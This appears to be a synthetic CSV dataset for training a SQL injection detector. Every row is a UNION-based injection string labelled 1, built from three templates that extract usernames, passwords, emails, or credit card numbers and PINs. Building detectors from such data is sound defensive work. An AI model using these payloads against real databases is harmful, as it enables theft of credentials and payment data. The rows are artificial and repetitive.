text,label
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6298;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3924;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-2264;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-9955;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5503;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-2472;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-8525;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-8306;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-9250;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1538;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1187;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-1674;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5033;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-3157;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3021;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-8632;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5727;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-8982;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6446;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5107;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-4131;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-8746;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6307;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-8342;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-2551;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1497;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-5721;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-1950;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3571;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-1822;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-1300;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-9871;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-5936;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-4824;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5462;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-5937;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-9393;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-4112;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-8703;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-4825;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-5278;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-4344;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-7581;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-2923;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-7020;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-4686;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-7569;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-7003;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-2119;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-6014;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-4472;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1519;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-3718;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-9769;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1264;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-7151;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-6190;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-7097;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6562;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1070;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-9618;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1540;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-8099;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-2590;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-7396;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3431;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5315;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3675;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-1406;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-1139;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3744;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-2980;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-1391;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-9795;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6908;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-9738;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1972;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-5413;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-7343;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-7060;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3565;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-8603;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-9185;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3817;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-1158;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-6966;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-8618;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-7730;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1343;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-8855;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5524;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-9084;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-4786;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-8196;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5011;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5137;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-8388;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-5781;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-2401;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-9690;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-4541;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-4347;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-4503;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-7048;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5901;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-5271;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-2920;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-9389;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-9241;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-9010;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-6951;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-9342;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-4987;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-2293;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-2626;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-9597;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-7475;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-2985;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-3014;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-7322;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-6539;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3174;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-4360;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-7125;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3137;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-8566;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-6104;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3350;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-7101;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-9122;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-9950;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-3536;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3099;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3001;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-6570;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1303;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-5917;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-5306;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6635;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-1816;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-8646;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-5030;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6361;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-2292;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1516;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-5727;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5342;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1513;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-1680;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-9714;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-1287;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1862;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6241;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3487;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-5336;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-6038;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1742;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-9852;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1490;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-1065;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-5186;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-2648;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3850;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3436;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-2121;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-8546;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-3277;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-9655;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-7723;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3166;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3154;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-2257;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-3666;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-8909;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-8490;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-9436;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1762;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-6448;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-7920;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-5849;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-2468;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-5332;",1
"SELECT * FROM products WHERE id = 10 UNION SELECT username, email FROM users --comment-1182;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-3680;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-5459;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-1010;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-8751;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-4945;",1
"SELECT name FROM employees WHERE id = 1 UNION SELECT card_number, pin FROM credit_cards --comment-8714;",1
"SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins --comment-6463;",1
